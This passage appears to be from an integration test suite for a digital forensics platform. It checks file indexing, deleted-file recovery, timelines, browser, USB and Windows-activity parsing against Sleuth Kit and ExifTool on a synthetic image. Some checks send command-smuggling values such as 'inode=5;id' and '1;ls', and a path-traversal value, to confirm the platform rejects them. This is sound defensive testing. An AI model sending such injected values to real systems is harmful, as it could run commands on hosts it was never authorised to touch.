    job = db.jobs.find_one({'job_id': r.json['job_id']})
    check('a running job is claimed by one worker and sends heartbeats', job.get('worker') and job.get('heartbeat_at') and job.get('attempts') == 1,
          {k: job.get(k) for k in ('worker', 'heartbeat_at', 'attempts')})

    j = _analyse(inv, E, {'modules': ['fs_index']})
    s = j['result']['summary']
    check('re-running the file system index also refreshes the modules built on it',
          j['status'] == 'COMPLETED' and s['plan'] == AFTER_FS_INDEX and s['counts'] == C['COUNTS'], (s.get('plan'), s.get('counts')))
    j = _analyse(inv, E, {'modules': ['tz_probe']})
    s = j['result']['summary']
    check('re-reading the time zone re-indexes the file system and refreshes what is built on it (not the computer module)',
          j['status'] == 'COMPLETED' and s['plan'] == ['tz_probe'] + AFTER_FS_INDEX and s['counts'] == C['COUNTS'], s.get('plan'))

    # A broker redelivery of a finished job must not run it again.
    sys.path.insert(0, '/app')
    from app.tasks import forensic_analysis_task
    n = db.fs_entries.count_documents({'evidence_id': E})
    res = forensic_analysis_task.apply(args=(j['job_id'], E, C['INVESTIGATOR_id'])).get()
    check('a redelivered job that already ran is ignored, not run twice',
          res.get('status') == 'DUPLICATE_IGNORED' and db.fs_entries.count_documents({'evidence_id': E}) == n, res)

    # Output written before modules existed is replaced as a whole on the next run.
    db.fs_entries.update_many({'evidence_id': E}, {'$unset': {'pipeline_module': ''}})
    j = _analyse(inv, E, {'modules': ['yara']})
    s = j['result']['summary']
    check('output from before analysis modules existed is replaced as a whole',
          j['status'] == 'COMPLETED' and s['plan'] == STANDARD_MODULES and s['counts'] == C['COUNTS']
          and db.fs_entries.count_documents({'evidence_id': E, 'pipeline_module': {'$exists': False}}) == 0, s.get('plan'))

    # The quick profile, and adding a module to it later.
    q = post('/api/cases', inv, {'name': 'Quick triage profile', 'priority': 'LOW'}).json['case_id']
    qe = upload(inv, q, IMG.read_bytes(), 'quick.dd').json['evidence_id']
    j = _analyse(inv, qe, {'profile': 'quick'})
    s = j['result']['summary']
    same = lambda counts: all(counts.get(k) == C['COUNTS'][k] for k in ('files', 'deleted_files', 'browser_history', 'usb_devices', 'programs_run'))
    check('the quick profile runs the file system index and artifacts only (no file hashing or YARA)',
          s['plan'] == ['tz_probe', 'fs_index', 'computer', 'artifacts', 'registry', 'unix', 'phone'] and 'yara_matches' not in s['counts']
          and 'files_hashed' not in s['counts'] and same(s['counts']),
          (s.get('plan'), s.get('counts')))
    j = _analyse(inv, qe, {'modules': ['yara']})
    s = j['result']['summary']
    check('a module can be added later without re-running the others (only its missing prerequisite, file hashing, is added)',
          s['plan'] == ['fileproc', 'yara'] and s['counts'].get('yara_matches') == C['COUNTS']['yara_matches'] and same(s['counts']), (s.get('plan'), s.get('counts')))

    # Tags made with the older natural keys move to the new ones and still follow their item.
    ev = next(e for e in get(f"/api/forensics/timeline?case_id={C['A']}&limit=500", inv).json['data'] if e['type'] == 'RECENT_FILE_OPENED')
    t = post('/api/tags', inv, {'case_id': C['A'], 'item_type': 'TIMELINE_EVENT', 'item_id': ev['_id'], 'label': 'NOTABLE', 'note': 'key migration'}).json
    db.tags.update_one({'tag_id': t['tag_id']}, {'$set': {'key_version': 1, 'match': {
        'evidence_id': E, 'type': ev['type'], 'timestamp': iso(ev['timestamp']), 'description': ev['description']}}})
    from app.services.tags import migrate_keys
    migrate_keys(db)
    tag = db.tags.find_one({'tag_id': t['tag_id']})
    check('tags made with older keys are migrated to the new ones', tag['key_version'] == 2 and set(tag['match']) == {'evidence_id', 'nk'}, tag['match'])
    j = _analyse(inv, E, {'modules': ['artifacts']})
    check('...and still follow their item after it is re-created', j['result']['summary'].get('tags') == {'relinked': 1, 'unresolved': 0},
          j['result']['summary'].get('tags'))
    req('DELETE', f"/api/tags/{t['tag_id']}", inv)


@section('08 Partitions and filesystem index (vs Sleuth Kit)')
def t_filesystem():
    inv, E = C['INVESTIGATOR'], C['E']
    parts = get(f'/api/forensics/evidence/{E}/partitions', inv)
    pj = json.dumps(parts.json)
    mm = sh('mmls', str(IMG)).stdout.decode()
    check('partition table read (FAT32 partition at sector 2048)', parts.status == 200 and '2048' in pj and 'fat32' in pj.lower(), pj[:300])
    check('mmls run directly agrees (FAT32 at 2048)', re.search(r'0000002048\s+\S+\s+\S+\s+.*FAT32', mm), mm)
    truth = bodyfile_truth()
    real = [e for e in truth if not e['virtual']]
    C['TRUTH'] = truth
    allf = []
    skip = 0
    while True:
        page = get(f'/api/forensics/evidence/{E}/files?skip={skip}&limit=7', inv).json
        allf += page['data']
        skip += 7
        if skip >= page['total']:
            break
    check('file index total equals Sleuth Kit (non-virtual entries)', page['total'] == len(real), (page['total'], len(real)))
    check('paging returns every entry exactly once', len(allf) == len({(f['path'], f['inode']) for f in allf}) == len(real), len(allf))
    check('indexed paths equal Sleuth Kit paths', {f['path'] for f in allf} == {e['path'] for e in real},
          {f['path'] for f in allf} ^ {e['path'] for e in real})
    dele = get(f'/api/forensics/evidence/{E}/files?deleted=true', inv).json['data']
    truth_del = {e['path'] for e in real if e['deleted']}
    check('deleted files equal Sleuth Kit deleted entries', {d['path'] for d in dele} == truth_del, ({d['path'] for d in dele}, truth_del))
    check('the deleted payroll export is found', '/Users/alice/Documents/payroll-export.csv' in truth_del)
    pay = next(d for d in dele if d['path'].endswith('payroll-export.csv'))
    C['PAY'] = pay
    check('deleted file size is 2,191 bytes (true size)', pay['size'] == len(PAYROLL) == 2191, pay['size'])
    check('deleted file modified time is 2026-09-01 09:41:02 UTC', iso(pay['mtime']) == utc(2026, 9, 1, 9, 41, 2), pay['mtime'])
    q = get(f'/api/forensics/evidence/{E}/files?q=PAYROLL', inv).json
    want = {e['path'] for e in C['TRUTH'] if 'payroll' in e['path'].lower() and not e['virtual']}
    check('path filter is case-insensitive (the CSV, its Recent shortcut, q3-payroll.docx)', q['total'] == len(want) == 3
          and {d['path'] for d in q['data']} == want, (q['total'], want))
    check('regex characters in the filter are treated literally', get(f'/api/forensics/evidence/{E}/files?q=.%2A', inv).json['total'] == 0)
    check('deleted=false excludes the deleted file', all(not f['deleted'] for f in get(f'/api/forensics/evidence/{E}/files?deleted=false&limit=1000', inv).json['data']))
    ist = post(f"/api/forensics/evidence/{E}/istat?inode={pay['inode']}&offset={pay['partition_offset']}", inv)
    check('istat on the deleted file shows its size', ist.status == 200 and '2191' in json.dumps(ist.json), str(ist)[:200])
    check('istat refuses an injected inode value (400)', post(f"/api/forensics/evidence/{E}/istat?inode=5;id&offset=2048", inv).status == 400)


@section('08b Evidence source layer (pytsk3 reads equal icat and the generator manifest)')
def t_source():
    sys.path.insert(0, '/app')
    from app.forensic.source import BlobRef, TskImageSource
    src = TskImageSource(IMG)
    check('the partition volume is found (p2048)', src.volumes() == ['p2048'], src.volumes())
    files = [e for e in C['TRUTH'] if not e['virtual'] and e['mode'].startswith('r')]
    differ = []
    for e in files:
        icat = sh('icat', '-o', '2048', str(IMG), e['inode']).stdout
        data = src.read_range(BlobRef(C['E'], 'p2048', inode=e['inode']), 0, e['size'] + 1)
        if data != icat:
            differ.append((e['path'], len(data), len(icat)))
    check(f'in-process reads of all {len(files)} files (including deleted ones) equal icat byte for byte', files and not differ, differ[:5])
    walked = {(w['path'], w['deleted'], w['is_virtual']) for w in src.walk('p2048')}
    listed = {(e['path'], e['deleted'], e['virtual']) for e in C['TRUTH']}
    check('walking the volume lists the same entries as fls, virtual ones flagged', walked == listed,
          (sorted(walked - listed)[:5], sorted(listed - walked)[:5]))
    manifest = json.loads(IMG.with_suffix('.manifest.json').read_text())
    by_path = {e['path']: e for e in files}
    wrong = [f['path'] for f in manifest['files']
             if f['path'] not in by_path or by_path[f['path']]['deleted'] != f['deleted']
             or hashlib.sha256(src.read_range(BlobRef(C['E'], 'p2048', inode=by_path[f['path']]['inode']), 0, f['size'] + 1)).hexdigest() != f['sha256']]
    check(f"every file the generator wrote ({len(manifest['files'])}) is on the image with its exact content", not wrong
          and manifest['sha256'] == C['IMG_SHA256'], wrong)


@section('09 Deleted file recovery (vs original content)')
def t_recovery():
    inv, E, pay = C['INVESTIGATOR'], C['E'], C['PAY']
    r = post(f"/api/forensics/evidence/{E}/recover?inode={pay['inode']}&offset={pay['partition_offset']}", inv)
    j = r.json or {}
    check('recovery succeeds and keeps the original name', r.status == 200 and j.get('status') == 'COMPLETED'
          and j.get('filename') == 'payroll-export.csv' and j.get('was_deleted') is True, r)
    C['PAY_ART'] = j.get('artifact_id')
    check('recovered SHA-256 equals the original file that was deleted', j.get('sha256') == hashlib.sha256(PAYROLL).hexdigest(),
          (j.get('sha256'), hashlib.sha256(PAYROLL).hexdigest()))
    icat = sh('icat', '-o', str(pay['partition_offset']), str(IMG), pay['inode']).stdout
    check('...and equals icat run directly', hashlib.sha256(icat).hexdigest() == j.get('sha256'))
    dl = get(f"/api/forensics/artifacts/{j['artifact_id']}/download", inv)
    check('download returns the exact bytes', dl.status == 200 and dl.body == PAYROLL, len(dl.body))
    check('download carries the recorded SHA-256 header', dl.headers.get('X-DFIP-SHA256') == j['sha256'] or dl.headers.get('x-dfip-sha256') == j['sha256'], dl.headers)
    art = next(a for a in get(f"/api/forensics/artifacts?case_id={C['A']}&artifact_type=RECOVERED_FILE", inv).json['data'] if a['artifact_id'] == j['artifact_id'])
    check('recovered copy is read-only on disk (0440)', (Path(art['path']).stat().st_mode & 0o777) == 0o440, oct(Path(art['path']).stat().st_mode))
    cust = [c for c in get(f"/api/chain?case_id={C['A']}", inv).json['data'] if c['action'] == 'FILE_RECOVERED']
    check('recovery is recorded in the chain of custody with its hash', any(c.get('sha256') == j['sha256'] for c in cust))
    check('another investigator cannot download it (404)', get(f"/api/forensics/artifacts/{j['artifact_id']}/download", C['INV2']).status == 404)
    # a live (not deleted) file and the YARA sample
    files = {f['path']: f for f in get(f'/api/forensics/evidence/{E}/files?limit=1000', inv).json['data']}
    for path, content, key in (('/Users/alice/Documents/project-notes.txt', NOTES, 'NOTES_ART'), ('/Users/alice/Downloads/cleanup.ps1', CLEANUP, 'PS1_ART'),
                               ('/Users/alice/AppData/Local/Google/Chrome/User Data/Default/History', None, 'HIST_ART')):
        f = files[path]
        rr = post(f"/api/forensics/evidence/{E}/recover?inode={f['inode']}&offset={f['partition_offset']}", inv).json
        C[key] = rr.get('artifact_id')
        if content is not None:
            check(f'recovered {Path(path).name} matches the original byte for byte', rr.get('sha256') == hashlib.sha256(content).hexdigest(), rr)
    check('invalid inode is refused (400)', post(f'/api/forensics/evidence/{E}/recover?inode=../../x&offset=2048', inv).status == 400)
    nx = post(f'/api/forensics/evidence/{E}/recover?inode=999999&offset=2048', inv)
    check('nonexistent inode fails cleanly (no server error)', nx.status < 500 and (nx.json or {}).get('status') != 'COMPLETED', nx)
    meta = post(f"/api/forensics/artifacts/{C['PAY_ART']}/metadata", inv)
    exif = json.loads((meta.json or {}).get('stdout') or '[{}]')[0]
    check('ExifTool metadata of a recovered file (name, size, type)', meta.status == 200 and exif.get('System:FileName') == 'payroll-export.csv'
          and exif.get('System:FileSize') and exif.get('File:FileType'), {k: exif.get(k) for k in ('System:FileName', 'System:FileSize', 'File:FileType')})
    st = post(f"/api/forensics/artifacts/{C['PAY_ART']}/strings", inv)
    check('strings extraction finds the CSV header', st.status == 200 and 'employee,iban,salary' in (st.json or {}).get('stdout', ''), str(st)[:200])
    y = post(f"/api/forensics/artifacts/{C['PS1_ART']}/yara", inv)
    check('YARA scan of the recovered PowerShell script matches the encoded-command rule', y.status == 200
          and 'Suspicious_PowerShell_EncodedCommand' in (y.json or {}).get('stdout', ''), str(y)[:300])
    yc = post(f"/api/forensics/artifacts/{C['NOTES_ART']}/yara", inv)
    check('YARA scan of a harmless text file has no match', yc.status == 200 and (yc.json or {}).get('returncode') == 0
          and not (yc.json or {}).get('stdout', '').strip(), str(yc)[:300])
    pc = post(f"/api/forensics/artifacts/{C['PAY_ART']}/pcap", inv)
    check('PCAP analysis of a non-PCAP file fails cleanly', pc.status < 500, pc)
    mem = post(f"/api/forensics/artifacts/{C['PAY_ART']}/memory", inv, timeout=300)
    check('memory analysis of a non-memory file fails cleanly', mem.status < 500, str(mem)[:200])


@section('09b File viewer (hex and preview)')
def t_viewer():
    import base64
    import pymongo
    inv, E = C['INVESTIGATOR'], C['E']
    truth = {e['path']: e for e in C['TRUTH']}
    pay = C['PAY']
    base = f'/api/forensics/evidence/{E}'
    q = lambda inode: f'inode={inode}&offset=2048'
    page = lambda inode, start=0, length=4096: get(f'{base}/content?{q(inode)}&start={start}&length={length}', inv)
    p0 = page(pay['inode']).json
    check('hex page 0 of the deleted payroll export equals the original bytes', base64.b64decode(p0['data_b64']) == PAYROLL
          and p0['size'] == len(PAYROLL) and p0['eof'] is True, {k: p0.get(k) for k in ('start', 'length', 'size', 'eof')})
    s = page(pay['inode'], 100, 50).json
    check('a byte range in the middle (100-150) is exact', base64.b64decode(s['data_b64']) == PAYROLL[100:150] and s['start'] == 100)
    past = page(pay['inode'], 5000).json
    check('reading past the end returns no bytes and says so', past['length'] == 0 and past['eof'] is True, past)
    check('a folder cannot be viewed (400)', page(truth['/Users/alice/Documents']['inode']).status == 400)
    check('an invalid inode is 400 and an unknown one 404', page('1;ls').status == 400 and page('99999999').status == 404)
    check('beyond 256 MiB the viewer asks for a recovered copy (416)', page(pay['inode'], 300 * 1024 * 1024).status == 416)
    a = get(f"/api/forensics/artifacts/{C['PAY_ART']}/content?start=2000&length=500", inv).json
    check('a recovered file can be read at any offset', base64.b64decode(a['data_b64']) == PAYROLL[2000:2500], a.get('start'))

    pv = get(f'{base}/preview?{q(pay["inode"])}', inv).json
    check('preview: the CSV is detected as text and shown', pv['kind'] == 'text' and pv['text'] == PAYROLL.decode() and pv['encoding'] == 'UTF-8', pv.get('kind'))
    for path, kind, mime in (('/Users/alice/Pictures/whiteboard.png', 'image', 'image/png'), ('/Users/alice/Documents/offer-letter.pdf', 'pdf', 'application/pdf')):
        inode = truth[path]['inode']
        p = get(f'{base}/preview?{q(inode)}', inv).json
        raw = get(f'{base}/raw?{q(inode)}', inv)
        icat = sh('icat', '-o', '2048', str(IMG), inode).stdout
        h = {k.lower(): v for k, v in raw.headers.items()}
        check(f'{path.rsplit("/", 1)[-1]}: detected as {mime} from its content and rendered byte for byte',
              p['kind'] == kind and p['mime'] == mime and p['renderable'] is True and raw.status == 200 and raw.body == icat
              and h.get('content-type', '').startswith(mime), (p, raw.status))
        check(f'{path.rsplit("/", 1)[-1]}: served with nosniff, as an attachment, under a sandbox policy',
              h.get('x-content-type-options') == 'nosniff' and h.get('content-disposition') == 'attachment'
              and 'sandbox' in h.get('content-security-policy', ''), h)
    pf = next(p for p in truth if p.startswith('/Windows/Prefetch/'))
    bp = get(f'{base}/preview?{q(truth[pf]["inode"])}', inv).json
    check('a binary file (Prefetch) is reported as binary and not rendered (415)', bp['kind'] == 'binary'
          and get(f'{base}/raw?{q(truth[pf]["inode"])}', inv).status == 415, bp)
    check('another investigator cannot read the file (404)', get(f'{base}/content?{q(pay["inode"])}', C['INV2']).status == 404)
    db = pymongo.MongoClient(os.environ['MONGODB_URI'])['dfip']
    views = {a['metadata'].get('view') for a in db.audit_logs.find({'action': 'FILE_CONTENT_VIEWED', 'metadata.evidence_id': E})}
    check('viewing file content is recorded in the audit log', {'hex', 'preview', 'render'} <= views, views)


@section('10 Timeline (vs Sleuth Kit mactime)')
def t_timeline():
    inv, A = C['INVESTIGATOR'], C['A']
    truth = [e for e in C['TRUTH'] if not e['virtual']]
    expected_fs = sum(len(e['times']) for e in truth)
    # mactime itself, as an independent count
    with tempfile.NamedTemporaryFile('w', suffix='.body', delete=False) as fh:
        fh.write(sh('fls', '-z', COMPUTER_TZ, '-r', '-m', '/', '-o', '2048', str(IMG)).stdout.decode('utf-8', 'replace'))
    mt = sh('mactime', '-b', fh.name, '-d', '-y', '-z', 'UTC').stdout.decode('utf-8', 'replace').splitlines()[1:]
    mt_real = [l for l in mt if l.split(',')[3][:1] not in ('v', 'V') and not l.startswith('0000') and not l.startswith('1970-01-01T00:00:00')]
    fs = get(f'/api/forensics/timeline?case_id={A}&type=FILE_MACB&limit=1', inv).json['total']
    check('file events equal one per distinct MACB time (Sleuth Kit bodyfile)', fs == expected_fs, (fs, expected_fs))
    check('...and equal the mactime output', fs == len(mt_real), (fs, len(mt_real)))
    ev = get(f'/api/forensics/timeline?case_id={A}&order=asc&limit=2000', inv).json
    C['TL_TOTAL'] = ev['total']
    data = ev['data']
    ts = [iso(e['timestamp']) for e in data]
    check('oldest-first order is chronological', ts == sorted(ts))
    desc = [iso(e['timestamp']) for e in get(f'/api/forensics/timeline?case_id={A}&order=desc&limit=2000', inv).json['data']]
    check('newest-first order is reverse chronological', desc == sorted(desc, reverse=True))
    pay = [e for e in data if e['type'] == 'FILE_MACB' and e['path'].endswith('payroll-export.csv')]
    check('payroll export modification at 09:41:02 UTC, marked deleted',
          any(iso(e['timestamp']) == utc(2026, 9, 1, 9, 41, 2) and 'm' in e['macb'] and e['deleted'] for e in pay), pay)
    visits = {(e['browser'], iso(e['timestamp'])) for e in data if e['type'] == 'BROWSER_VISIT'}
    check('every browser visit is on the timeline at its true time', visits == {(b, t) for b, _, _, _, t in CHROME_VISITS}, visits)
    dls = {iso(e['timestamp']) for e in data if e['type'] == 'BROWSER_DOWNLOAD'}
    check('both downloads are on the timeline (10:05:00 and 10:33:05)', dls == {utc(2026, 9, 1, 10, 5), utc(2026, 9, 1, 10, 33, 5)}, dls)
    usb = [e for e in data if e['type'] == 'USB_ACTIVITY']
    check('SanDisk first install at 14:12:44 UTC is on the timeline',
          any(iso(e['timestamp']) == utc(2026, 9, 1, 14, 12, 44) and 'SanDisk' in e['description'] for e in usb), [e['description'] for e in usb])
    check('USB event count equals the USB times the devices have (registry, setupapi.dev.log and event log connects and removals)', len(usb) == sum(
        sum(1 for k in ('first_install', 'last_install', 'last_arrival', 'last_removal', 'setupapi_first_install') if d.get(k))
        + sum(1 for x in d.get('eventlog_events') or [] if x['action'] in ('connected', 'removed', 'driver installed'))
        for d in get(f'/api/forensics/usb?case_id={A}', inv).json['data']), len(usb))
    tv = get(f'/api/forensics/timeline?case_id={A}&type=BROWSER_VISIT', inv).json
    check('type filter (6 browser visits)', tv['total'] == 6 and all(e['type'] == 'BROWSER_VISIT' for e in tv['data']), tv['total'])
    multi = get(f'/api/forensics/timeline?case_id={A}&type=BROWSER_VISIT,BROWSER_DOWNLOAD', inv).json['total']
    check('several types at once (6 visits + 2 downloads)', multi == 8, multi)
    win = get(f'/api/forensics/timeline?case_id={A}&start=2026-09-01T10:00:00Z&end=2026-09-01T10:30:00Z&limit=2000', inv).json
    inside = [e for e in data if utc(2026, 9, 1, 10) <= iso(e['timestamp']) <= utc(2026, 9, 1, 10, 30)]
    check('time window filter is inclusive and exact', win['total'] == len(inside) and all(
        utc(2026, 9, 1, 10) <= iso(e['timestamp']) <= utc(2026, 9, 1, 10, 30) for e in win['data']), (win['total'], len(inside)))
    off = get(f'/api/forensics/timeline?case_id={A}&start=2026-09-01T15:30:00%2B05:30&end=2026-09-01T16:00:00%2B05:30&limit=2000', inv).json
    check('a time window with a UTC offset is converted correctly', off['total'] == win['total'], (off['total'], win['total']))
    tq = get(f'/api/forensics/timeline?case_id={A}&q=payroll&limit=2000', inv).json
    check('text search over descriptions', tq['total'] >= 2 and all('payroll' in e['description'].lower() for e in tq['data']), tq['total'])
    pages = []
    for s in range(0, ev['total'], 9):
        pages += get(f'/api/forensics/timeline?case_id={A}&order=asc&skip={s}&limit=9', inv).json['data']
    check('paging returns every event once, in order', [p['_id'] for p in pages] == [e['_id'] for e in data])
    check('an invalid start time is 400', get(f'/api/forensics/timeline?case_id={A}&start=yesterday', inv).status == 400)
    h = get(f'/api/forensics/timeline/histogram?case_id={A}', inv).json
    check('histogram covers every event', sum(b['total'] for b in h['buckets']) == ev['total'], (sum(b['total'] for b in h['buckets']), ev['total']))
    check('histogram type breakdown adds up', all(sum(b['by_type'].values()) == b['total'] for b in h['buckets']))
    note('histogram unit for full range', f"{h['unit']} ({h['first']} .. {h['last']}, {len(h['buckets'])} buckets)")
    hd = get(f'/api/forensics/timeline/histogram?case_id={A}&start=2026-09-01T00:00:00Z&end=2026-09-01T23:59:59Z', inv).json
    one_day = get(f'/api/forensics/timeline?case_id={A}&start=2026-09-01T00:00:00Z&end=2026-09-01T23:59:59Z&limit=1', inv).json['total']
    check('one-day window uses hourly columns that add up', hd['unit'] == 'hour' and sum(b['total'] for b in hd['buckets']) == one_day, (hd['unit'], one_day))
    check("another investigator gets 404 for the case's timeline", get(f'/api/forensics/timeline?case_id={A}', C['INV2']).status == 404)
    all2 = get('/api/forensics/timeline?limit=2000', C['INV2']).json['data']
    check("timeline without a case filter never includes other teams' events", all(e['case_id'] != A for e in all2))


@section('11 Browser history and downloads')
def t_browser():
    inv, A = C['INVESTIGATOR'], C['A']
    h = get(f'/api/forensics/browser?case_id={A}&kind=BROWSER_HISTORY', inv).json
    got = {(r['browser'], r['url'], r.get('title'), r.get('visit_count'), iso(r.get('last_visit_time'))) for r in h['data']}
    check('exactly the 6 visits in the image, with titles, counts and UTC times', got == CHROME_VISITS, got ^ CHROME_VISITS)
    check('each record names its source database', all(('History' in r.get('source_path', '') or 'places.sqlite' in r.get('source_path', ''))
                                                       for r in h['data']), [r.get('source_path') for r in h['data']])
    check('browser filter (Chrome: 4)', get(f'/api/forensics/browser?case_id={A}&browser=Chrome', inv).json['total'] == 4)
    check('search filter ("usb": 1)', get(f'/api/forensics/browser?case_id={A}&search=usb', inv).json['total'] == 1)
    d = get(f'/api/forensics/browser?case_id={A}&kind=BROWSER_DOWNLOAD', inv).json['data']
    chrome = next((x for x in d if x['browser'] == 'Chrome'), {})
    ff = next((x for x in d if x['browser'] == 'Firefox'), {})
    check('Chrome download: SecureDelete.exe from tools.example.org', len(d) == 2 and chrome.get('target_path') == r'C:\Users\alice\Downloads\SecureDelete.exe'
          and chrome.get('tab_url') == 'https://tools.example.org/securedelete' and iso(chrome.get('start_time')) == utc(2026, 9, 1, 10, 5), chrome)
    check('Firefox download: archiver.zip with its source URL', ff.get('target_path') == 'file:///C:/Users/alice/Downloads/archiver.zip'
          and ff.get('tab_url') == 'https://cdn.example.org/tools/archiver.zip', ff)
    check('invalid kind is 400', get(f'/api/forensics/browser?case_id={A}&kind=EVIL', inv).status == 400)
    # parse a recovered History file again through the explicit parser
    bp = post(f"/api/forensics/artifacts/{C['HIST_ART']}/browser-parse", inv)
    check('a recovered History file can be parsed on demand', bp.status == 200 and bp.json['kind'] and bp.json['rows_persisted'] == 5, bp)
    bk = post(f"/api/forensics/artifacts/{C['PAY_ART']}/browser-parse", inv)
    check('a non-browser file is refused with an explanation (400)', bk.status == 400, bk)


@section('12 USB device history (vs registry read directly)')
def t_usb():
    inv, A = C['INVESTIGATOR'], C['A']
    devs = get(f'/api/forensics/usb?case_id={A}', inv).json['data']
    note('USB devices found', [(d.get('friendly_name'), d.get('serial')) for d in devs])
    # ground truth: SYSTEM hive and setupapi.dev.log extracted with icat, parsed with regipy here
    files = {e['path']: e for e in C['TRUTH']}
    hive = Path(tempfile.mkdtemp()) / 'SYSTEM'
    hive.write_bytes(sh('icat', '-o', '2048', str(IMG), files['/Windows/System32/config/SYSTEM']['inode']).stdout)
    from regipy.registry import RegistryHive
    reg = RegistryHive(str(hive))

    def key(path):
        for p in (path, '\\' + path):
            try:
                return reg.get_key(p)
            except Exception:
                pass
        return None
    serials = set()
    usbstor = key('ControlSet001\\Enum\\USBSTOR')
    for dev in usbstor.iter_subkeys():
        for inst in dev.iter_subkeys():
            serials.add(re.sub(r'&\d+$', '', inst.name).upper())
    tz = {v.name: v.value for v in key('ControlSet001\\Control\\TimeZoneInformation').iter_values()}
    bias = tz.get('ActiveTimeBias', tz.get('Bias', 0))
    bias = bias - 2 ** 32 if bias >= 2 ** 31 else bias
    note('registry ground truth', f'USBSTOR serials={sorted(serials)}, ActiveTimeBias={bias} min')
    log = sh('icat', '-o', '2048', str(IMG), files['/Windows/INF/setupapi.dev.log']['inode']).stdout.decode('utf-8', 'replace')
    first = {}
    for m in re.finditer(r'USBSTOR\\[^\]]*\\([^\\\]&]+)(?:&\d+)?\]\s*\r?\n>>>\s+Section start (\d{4}/\d\d/\d\d \d\d:\d\d:\d\d)', log):
        local = datetime.strptime(m.group(2), '%Y/%m/%d %H:%M:%S').replace(tzinfo=ZoneInfo(COMPUTER_TZ))
        first.setdefault(m.group(1).upper(), local.astimezone(timezone.utc))
    by = {d['serial'].upper(): d for d in devs}
    check('every USBSTOR device in the registry is reported', serials <= set(by), (serials, set(by)))
    check('the device only in setupapi.dev.log (SanDisk) is reported', '4C530001230518109141' in by, set(by))
    for serial, when in first.items():
        d = by.get(serial, {})
        check(f"setupapi first install for {serial} is {when:%Y-%m-%d %H:%M:%S} UTC (log time in the computer's time zone)",
              iso(d.get('setupapi_first_install')) == when, d.get('setupapi_first_install'))
    hp = by.get('AA951D0000007252', {})
    check('HP v100w: vendor/product, VID 03F0, PID 3207', 'HP' in (hp.get('vendor') or '') and 'v100w' in (hp.get('product') or '')
          and hp.get('vid') == '03F0' and hp.get('pid') == '3207', {k: hp.get(k) for k in ('vendor', 'product', 'vid', 'pid')})
    check('HP v100w: drive letter from MountedDevices', hp.get('drive_letters'), hp.get('drive_letters'))
    sd = by.get('4C530001230518109141', {})
    check('SanDisk: times the evidence does not contain are left empty (not estimated)',
          not sd.get('first_install') and not sd.get('last_arrival') and not sd.get('last_removal'), {k: sd.get(k) for k in ('first_install', 'last_arrival', 'last_removal')})
    check('another investigator gets 404 for the USB list', get(f'/api/forensics/usb?case_id={A}', C['INV2']).status == 404)


# What scripts/test-image/make_artifacts.py wrote (UTC): SecureDelete ran at 10:06:02 and 14:18:30, the payroll
# export was opened from E: (the SanDisk, label CRUZER) at 14:14:06 and moved to the Recycle Bin at 14:15:20.
SECUREDELETE_PATH = r'\VOLUME{01dc1f2a3b4c5d6e-5e1f22c4}\USERS\ALICE\DOWNLOADS\SECUREDELETE.EXE'
RECENT_LNK = '/Users/alice/AppData/Roaming/Microsoft/Windows/Recent/payroll-export.csv.lnk'
RECYCLE_DIR = '/$Recycle.Bin/S-1-5-21-3623811015-3361044348-30300820-1001'


@section('12b Windows activity (vs ExifTool and the generator)')
def t_activity():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    act = lambda kind, extra='': get(f'/api/forensics/activity?case_id={A}&kind={kind}{extra}', inv)
    truth = {e['path']: e for e in C['TRUTH']}
    check('Sleuth Kit lists the Recycle Bin, Recent shortcut and Prefetch files under their exact names',
          {f'{RECYCLE_DIR}/$I3K9D2A.csv', f'{RECYCLE_DIR}/$R3K9D2A.csv', RECENT_LNK} <= set(truth)
          and any(p.startswith('/Windows/Prefetch/SECUREDELETE.EXE-') for p in truth), sorted(p for p in truth if 'Recycle' in p))

    runs = act('PROGRAM_RUN').json['data']
    pf = next((r for r in runs if r.get('executable') == 'SECUREDELETE.EXE'), {})
    check('Prefetch: SECUREDELETE.EXE ran twice, last at 14:18:30 and before that at 10:06:02 UTC',
          pf.get('run_count') == 2 and [iso(t) for t in pf.get('last_run_times', [])] == [utc(2026, 9, 1, 14, 18, 30), utc(2026, 9, 1, 10, 6, 2)], pf)
    check('Prefetch: executable path, volume serial and loaded files',
          pf.get('executable_path') == SECUREDELETE_PATH and [v.get('serial') for v in pf.get('volumes', [])] == ['5E1F-22C4']
          and any(f.endswith('PAYROLL-EXPORT.CSV') for f in pf.get('referenced_files', [])), {k: pf.get(k) for k in ('executable_path', 'volumes')})

    recent = act('RECENT_FILE').json['data']
    lnk = next((r for r in recent if r.get('source_path') == RECENT_LNK), {})
    work = Path(tempfile.mkdtemp())
    (work / 'r.lnk').write_bytes(sh('icat', '-o', '2048', str(IMG), truth[RECENT_LNK]['inode']).stdout)
    exif = json.loads(subprocess.run(['exiftool', '-json', '-n', '-G1', '-a', '-s', str(work / 'r.lnk')], capture_output=True,
                                     text=True, env={'TZ': 'UTC', 'PATH': '/usr/bin:/bin'}).stdout)[0]
    tag = lambda name: next((v for k, v in exif.items() if k.endswith(':' + name)), None)
    exif_time = lambda name: datetime.strptime(str(tag(name))[:19], '%Y:%m:%d %H:%M:%S').replace(tzinfo=timezone.utc) if tag(name) else None
    serial = tag('DriveSerialNumber')
    check('Recent shortcut: target, drive and size equal ExifTool on the extracted shortcut',
          lnk.get('target_path') == tag('LocalBasePath') == r'E:\payroll-export.csv' and lnk.get('drive_type') == 'Removable'
          and tag('DriveType') == 2 and lnk.get('volume_label') == tag('VolumeLabel') == 'CRUZER'
          and serial is not None and lnk.get('drive_serial') == f'{serial >> 16:04X}-{serial & 0xFFFF:04X}'
          and lnk.get('target_size') == tag('TargetFileSize') == len(PAYROLL), (lnk, exif))
    check('Recent shortcut: target times equal ExifTool',
          iso(lnk.get('target_created')) == exif_time('CreateDate') and iso(lnk.get('target_modified')) == exif_time('ModifyDate')
          and iso(lnk.get('target_accessed')) == exif_time('AccessDate'), {k: lnk.get(k) for k in ('target_created', 'target_modified', 'target_accessed')})
    check('Recent shortcut: last opened = the shortcut file\'s own time (14:14:06)',
          iso(lnk.get('lnk_modified')) == datetime.fromtimestamp(truth[RECENT_LNK]['mtime'], timezone.utc) == utc(2026, 9, 1, 14, 14, 6), lnk.get('lnk_modified'))

    rb = act('RECYCLE_BIN_ITEM').json['data']
    item = next((r for r in rb if r.get('index_name') == '$I3K9D2A.csv'), {})
    check('Recycle Bin: original path, size and deletion time from the $I record',
          item.get('original_path') == r'C:\Users\alice\Documents\payroll-export.csv' and item.get('original_size') == len(PAYROLL)
          and iso(item.get('deleted_time')) == utc(2026, 9, 1, 14, 15, 20) and item.get('format_version') == 2, item)
